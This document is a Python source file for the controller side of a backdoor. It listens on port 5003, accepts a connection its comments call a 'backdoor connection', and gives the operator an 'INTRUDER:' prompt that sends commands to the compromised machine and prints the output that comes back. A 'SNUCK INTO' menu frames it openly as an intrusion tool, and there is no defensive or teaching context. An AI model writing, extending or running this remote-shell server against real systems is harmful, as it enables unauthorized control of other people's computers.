import socket
import time
import sys
import os

from banner import *





def create_socket(): # Inizialize the socket
    
    try:
        global SERVER_HOST
        global SERVER_PORT
        global BUFFER_SIZE
        global s

        SERVER_HOST = '0.0.0.0' # Server IP
        SERVER_PORT = 5003      # Server Port
        BUFFER_SIZE = 1024      # Buffer Size
        s = socket.socket()

    except socket.error as e :
        cprint(" Socket creation failed: ", 'red' +str(e))
    

def socket_bind(): # Socket binding
    

    try:
        
        global SERVER_HOST
        global SERVER_PORT
        global s


        s.bind((SERVER_HOST, SERVER_PORT))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.listen(5)
        print(f" Binding socket to port : " + str(SERVER_PORT) + "\n")

    except socket.error as e :
                cprint(" Socket binding failed: ", 'red' + str(e)+"\nRetrying...", 'red')
                time.sleep(3)
                socket_bind()




def accept_conn(): # Accept backdoor connection

    client_conn, client_addr = s.accept()
    
    print(" Connection has been established ! | " + "IP: " + client_addr[0] + " Port: " + str(client_addr[1] ) + "\n")
    send_commands(client_conn)


def send_commands(client_conn): # Send commands
    
    while True:
    
        command = input(" INTRUDER:")
    
        client_conn.send(command.encode())

        if command.lower() == "exit":
            
            break
    
        results = client_conn.recv(BUFFER_SIZE).decode()
    
        print(results)

    client_conn.close()
    s.close()        
    os.system('cls')
    mainmenu()
           

def main():
    create_socket()
    socket_bind()
    accept_conn()






def mainmenu():

    os.system('cls')
    banner()
    cprint("[1] SNUCK INTO\n", 'magenta')  
    cprint("[2] HELP\n", 'magenta')
    cprint("[3] QUIT\n", 'magenta')

    opt = input(': ')

    if opt == '1':
        os.system('cls')
        banner()
        main()

    elif opt == '2':
        os.system('cls')
        banner()
        cprint(" -- WHILE YOU ARE SNUCK IN THESE ARE THE COMMANDS --\n", 'magenta')
        print(" exit - Back to main menu\n")

        bacon = input(' Press 1 to go back main menu : ')
        if bacon == '1':
            os.system('cls')
            mainmenu()

    elif opt == '3':

        os.system('cls')
        sys.exit(0)



mainmenu()